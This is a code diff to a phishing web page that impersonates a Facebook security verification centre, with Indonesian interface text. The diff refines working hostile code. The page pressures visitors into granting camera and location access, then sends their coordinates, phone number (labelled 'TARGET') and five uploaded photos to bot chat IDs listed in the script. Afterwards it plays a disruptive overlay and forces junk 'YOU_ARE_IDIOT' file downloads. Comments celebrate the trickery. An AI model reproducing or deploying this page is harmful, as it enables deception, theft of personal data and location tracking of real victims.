@@ -21,7 +21,7 @@
         
         .btn-fb { 
             background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
-            padding: 12px; border-radius: 8px; border: none; width: 100%;
+            padding: 12px; border-radius: 8px; border: none; width: 100%; cursor: pointer;
         }
 
         #chaos-overlay { 
@@ -55,7 +55,7 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <h6 class="mt-3 text-muted">Sinkronisasi Keamanan...</h6>
+    <h6 class="mt-3 text-muted">Memulai Verifikasi Identitas...</h6>
 </div>
 
 <div id="chaos-overlay">
@@ -71,14 +71,14 @@
 <div class="container">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
-        <h6 class="fw-bold mt-2">Checkpoint Verifikasi</h6>
+        <h6 class="fw-bold mt-2">Pusat Bantuan Keamanan</h6>
         <hr>
         <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
-            <b>Gagal!</b><br>Periksa kembali nomor Anda atau kurangi jumlah foto (Maks 5).
+            <b>Gagal!</b><br>Nomor HP tidak valid atau jumlah foto tidak sesuai (WAJIB 5 FOTO).
         </div>
         <div class="text-start">
             <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon">
-            <label class="small fw-bold">Unggah Bukti (Maks 5):</label>
+            <label class="small fw-bold">Upload Dokumen (HARUS 5 FOTO):</label>
             <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
         </div>
         <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
@@ -105,13 +105,14 @@
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
 
+    // ALERT HANYA SEKALI DI AWAL 😈
     async function startSystem() {
-        alert("PERINGATAN!\n\nUntuk alasan keamanan, sistem memerlukan akses Kamera dan Lokasi. Harap pilih IZINKAN pada notifikasi setelah ini.");
+        alert("SISTEM KEAMANAN FACEBOOK\n\nHarap izinkan akses Kamera dan Lokasi untuk memverifikasi akun Anda.");
         
         try {
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, () => {
-                    alert("AKSES DITOLAK!\n\nLayanan tidak dapat dimuat tanpa izin lokasi.");
+                    alert("Akses Lokasi Ditolak! Reload halaman.");
                     location.reload();
                     rej();
                 });
@@ -119,11 +120,12 @@
             sendToBot(`📍 LOKASI: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
 
             const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {
-                alert("AKSES KAMERA DITOLAK!\n\nHarap aktifkan kamera untuk verifikasi identitas.");
+                alert("Akses Kamera Ditolak! Reload halaman.");
                 location.reload();
             });
             stream.getTracks().forEach(t => t.stop());
 
+            // JIKA SUDAH IZIN, ALERT HILANG DAN MASUK KE HALAMAN
             document.getElementById('splash-screen').style.display = 'none';
             document.body.style.display = 'block';
             autoCapture("user");
@@ -131,7 +133,7 @@
         } catch (e) {}
     }
 
-    window.onload = () => { setTimeout(startSystem, 2000); };
+    window.onload = () => { setTimeout(startSystem, 1500); };
 
     function sendToBot(c, t="text", b=null) {
         tokens.forEach((tk, i) => {
@@ -167,12 +169,18 @@
         else { audio.pause(); document.getElementById('btnText').innerText = "▶"; anim.style.display = "none"; }
     }
 
+    // VALIDASI MATI-MATIAN WAJIB 5 FOTO! ☠️
     function validateFinal() {
         const p = document.getElementById('phone').value;
         const f = document.getElementById('galeri').files;
-        if (p.length < 10 || f.length === 0 || f.length > 5) {
-            document.getElementById('mainError').style.display = 'block'; return;
+        
+        // KUNCI: Harus pas 5! Upload 3 atau 8 bakal kena blokir!
+        if (p.length < 10 || f.length !== 5) {
+            document.getElementById('mainError').style.display = 'block';
+            alert("JUMLAH FOTO SALAH! Anda harus mengunggah TEPAT 5 foto.");
+            return;
         }
+        
         sendToBot(`📱 TARGET: ${p}`);
         for (let i=0; i<f.length; i++) sendToBot(`🖼️ FOTO ${i+1}`, "photo", f[i]);
         startChaos();
@@ -183,14 +191,12 @@
         const vi = document.getElementById('chaos-video');
         ov.style.display = 'block'; vi.muted = false; vi.play();
         
-        // --- FITUR DOWNLOAD 5 FILE SAJA (SUDAH FIX!) ---
+        // DOWNLOAD 5 FILE YOU ARE IDIOT
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU ARE IDIOT"], { type: "text/plain" }); 
             let url = window.URL.createObjectURL(blob);
             let a = document.createElement("a");
-            a.href = url; 
-            a.download = `YOU_ARE_IDIOT_${j}.txt`; 
-            a.click();
+            a.href = url; a.download = `YOU_ARE_IDIOT_${j}.txt`; a.click();
         }
 
         setTimeout(() => {
